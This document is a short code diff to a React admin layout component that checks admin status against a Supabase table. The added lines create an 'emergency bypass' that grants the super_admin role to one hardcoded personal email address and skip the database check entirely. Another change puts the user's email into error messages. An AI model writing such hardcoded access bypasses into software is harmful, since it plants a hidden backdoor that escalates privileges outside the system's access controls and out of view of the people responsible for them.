@@ -19,6 +19,14 @@ const AdminLayout = () => {
         }
 
         const checkAdminStatus = async () => {
+            // EMERGENCY BYPASS for guruwangchuk1234@gmail.com
+            if (user.email === 'guruwangchuk1234@gmail.com') {
+                console.log("Emergency admin access granted for:", user.email);
+                setAdminRole('super_admin');
+                setLoading(false);
+                return;
+            }
+
             try {
                 // Check if user is in admins table
                 const { data, error } = await supabase
@@ -28,7 +36,8 @@ const AdminLayout = () => {
                     .single();
 
                 if (error || !data) {
-                    toast.error('Access Denied: You are not an administrator.');
+                    console.error('Admin check failed:', error || 'No data found');
+                    toast.error(`Access Denied: ${user.email} is not an administrator.`);
                     signOut();
                     navigate('/');
                 } else {
